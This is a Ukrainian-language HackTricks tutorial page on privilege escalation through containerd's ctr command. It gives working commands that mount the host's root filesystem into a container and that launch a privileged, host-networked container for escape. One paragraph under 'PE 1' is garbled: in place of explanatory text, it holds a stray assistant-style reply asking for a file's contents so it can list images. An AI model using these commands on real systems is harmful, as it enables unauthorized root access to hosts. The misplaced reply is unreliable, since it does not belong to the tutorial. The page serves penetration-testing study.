# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

Перейдіть за наступним посиланням, щоб дізнатися **де `containerd` і `ctr` розташовані в стеку контейнерів**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

якщо ви виявите, що на хості є команда `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Будь ласка, надішліть вміст файлу src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md або вставте частину з посиланнями/вбудованими зображеннями — я перелічу всі зображення та їх шляхи. Якщо потрібен лише список імен файлів зображень, уточніть.
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
А потім **запустіть один із тих образів, примонтувавши до нього кореневу директорію хоста**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Запустіть контейнер у привілейованому режимі і виконайте escape з нього.\
Ви можете запустити привілейований контейнер так:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Потім ви можете використати деякі з технік, згаданих на наступній сторінці, щоб **втекти з нього, зловживаючи привілейованими можливостями**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
